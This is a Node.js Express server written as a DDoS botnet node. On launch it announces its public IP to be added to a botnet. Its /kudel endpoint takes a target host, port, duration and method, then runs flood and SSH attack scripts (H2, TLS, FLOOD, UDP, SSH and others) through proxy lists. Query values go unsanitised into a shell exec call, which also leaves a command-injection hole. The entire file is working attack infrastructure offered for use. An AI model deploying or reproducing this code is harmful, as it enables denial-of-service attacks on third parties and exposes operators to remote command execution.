const express = require('express');
const { exec } = require('child_process');
const url = require('url');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;
async function fetchData() {
const response = await fetch('https://httpbin.org/get');
const data = await response.json();
console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}`);
return data
}

app.get('/kudel', (req, res) => {
  const { host, port, time, methods } = req.query;
  
  if (!host || !port  || !time || !methods) {
    return res.status(400).json({
      error: 'Missing required parameters'
    });
  }

  res.status(200).json({
    message: 'API request received. Executing script shortly.',
    target: host,
    time,
    methods
  });

  console.log(`Received attack request: Method ${methods}, Target ${host}, Duration ${time}s`);

  const attackMethods = {
    'H2': `./lib/cache/h2.js ${host} ${time} 45 12 proxy.txt`,
    'TLS': `./lib/cache/tls.js ${host} ${time} 32 8 proxy.txt`,
    'FLOOD': `./lib/cache/flood.js ${host} ${time} 56 12 proxy.txt`,
    'MIX': `./lib/cache/mix.js ${host} ${time} 12 45 proxy.txt -v 3`,
    'SKIBIDI': `./lib/cache/skibidi.js ${host} ${time}`,
    'UDP': `./lib/cache/udp.js ${host} ${port} ${time}`,
    'SSH': `./lib/cache/ssh.js ${host} ${port} root ${time}`
  };

  const selectedMethod = attackMethods[methods];
  
  if (selectedMethod) {
    if (Array.isArray(selectedMethod)) {
      selectedMethod.forEach(script => {
        exec(`node ${script}`, (error, stdout, stderr) => {
          if (error) {
            console.error(`Execution error: ${error}`);
            return;
          }
          console.log(`Executed: ${script}`);
        });
      });
    } else {
      exec(`node ${selectedMethod}`, (error, stdout, stderr) => {
        if (error) {
          console.error(`Execution error: ${error}`);
          return;
        }
        console.log(`Executed: ${selectedMethod}`);
      });
    }
  } else {
    console.log(`Unsupported method: ${methods}`);
  }
});
app.listen(port, () => {
fetchData()
});
